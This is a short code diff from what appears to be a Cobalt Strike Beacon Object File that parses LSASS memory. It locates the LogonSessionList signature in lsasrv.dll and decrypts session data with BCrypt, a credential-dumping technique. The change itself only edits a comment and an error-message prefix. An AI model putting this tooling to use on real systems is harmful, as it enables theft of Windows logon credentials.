@@ -123,7 +123,7 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD dBuildNumber, DWORD lo
     DWORD lsasrvTextSize = pNtHdr->OptionalHeader.SizeOfCode;
 
     //
-    // Search for l_LogSessList signature within wdigest.dll and grab the offset
+    // Search for LogonSessionList signature within lsasrv.dll and grab the offset
     //
     DWORD LogonSessionListSigOffset = SearchPattern(lsasrvTextBase, lsasrvTextSize, LogonSessionListSig, SigSize);
     if (LogonSessionListSigOffset == 0) {
@@ -290,7 +290,7 @@ BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHe
                         }
                         else
                         {
-                            BeaconFormatPrintf(&outputbuffer, "Error in BCryptOpenAlgorithmProvider: 0x%lx\n", status);
+                            BeaconFormatPrintf(&outputbuffer, "[!] Error in BCryptOpenAlgorithmProvider: 0x%lx\n", status);
                         }
                     }
                     else 
